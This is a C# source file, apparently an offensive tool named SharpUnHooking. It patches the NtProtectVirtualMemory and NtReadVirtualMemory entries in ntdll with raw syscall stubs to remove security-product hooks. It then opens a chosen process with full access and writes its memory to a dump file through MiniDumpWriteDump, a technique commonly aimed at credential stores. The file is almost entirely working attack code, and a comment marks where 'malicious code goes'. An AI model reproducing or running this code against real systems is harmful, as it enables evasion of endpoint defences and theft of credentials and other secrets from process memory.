using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace SharpUnHooking
{
    class Program
    {
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(Int32 processAccess, bool bInheritHandle, Int32 processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateFile(string filename, Int32 access, Int32 share, IntPtr securityAttributes, Int32 creationDisposition, Int32 flagsAndAttributes, IntPtr templateFile);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate bool MiniDumpWriteDump(IntPtr hProcess, Int32 ProcessId, IntPtr hFile, Int32 DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

        static private void CleanUp()
        {
            IntPtr dllHandle = LoadLibrary("ntdll.dll");
            IntPtr NtProtectVirtualMemory = GetProcAddress(dllHandle, "NtProtectVirtualMemory");
            IntPtr NtReadVirtualMemory = GetProcAddress(dllHandle, "NtReadVirtualMemory");

            Console.WriteLine("NtProtectVirtualMemory at 0x{0}", NtProtectVirtualMemory.ToString("X"));
            Console.WriteLine("NtReadVirtualMemory at 0x{0}", NtReadVirtualMemory.ToString("X"));

            PatchHook(NtProtectVirtualMemory, 0x50, 0x00);
            PatchHook(NtReadVirtualMemory, 0x3f, 0x00);
        }

        static private void PatchHook(IntPtr address, byte syscall, byte high)
        {
            uint PAGE_EXECUTE_READWRITE = 0x40;
            uint OldProtection;
            byte[] patch = new byte[] { 0x4c, 0x8b, 0xd1, 0xb8, syscall, high, 0x00, 0x00, 0x0f, 0x05, 0xc3};
            int length = patch.Length;

            VirtualProtect(address, (uint)length, PAGE_EXECUTE_READWRITE, out OldProtection);
            Marshal.Copy(patch, 0, address, length);
        }
        static void Main(string[] args)
        {
            CleanUp();
            Console.WriteLine("Clean Up Completed");

            // malicious code goes here

            Int32 PID = Convert.ToInt32(args[0]);
            IntPtr hFile = IntPtr.Zero;
            IntPtr hProc = IntPtr.Zero;
            bool bSuccess = false;


            IntPtr createPtr = GetProcAddress(LoadLibrary("Dbghelp.dll"), "MiniDumpWriteDump");
            MiniDumpWriteDump miniDumpWriteDump = (MiniDumpWriteDump)Marshal.GetDelegateForFunctionPointer(createPtr, typeof(MiniDumpWriteDump));

            Console.WriteLine("MiniDumpWriteDump found at 0x{0}", createPtr.ToString("X"));
            // PROCESS_ALL_ACCESS 0x001F0FFF
            hProc = OpenProcess(0x001F0FFF, false, PID);
            Console.WriteLine("Process HANDLE 0x{0}\n", hProc.ToString("X"));

            if (hProc == IntPtr.Zero)
            {
                Console.WriteLine("HANDLE is NULL. Exiting");
                Environment.Exit(0);
            }

            // GENERIC_WRITE 1073741824
            // FILE_SHARE_WRITE 2
            // CREATE_ALWAYS 2
            // FILE_ATTRIBUTE_NORMAL 128
            hFile = CreateFile("memory.dmp", 1073741824, 2, IntPtr.Zero, 2, 128, IntPtr.Zero);
            Console.WriteLine("memory.dmp HANDLE 0x{0}\n", hFile.ToString("X"));

            if (hFile == IntPtr.Zero)
            {
                Console.WriteLine("HANDLE is NULL. Exiting");
                Environment.Exit(0);
            }

            bSuccess = miniDumpWriteDump(hProc, PID, hFile, 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            Console.WriteLine("Process Completed ({0})", bSuccess);

        }
    }
}
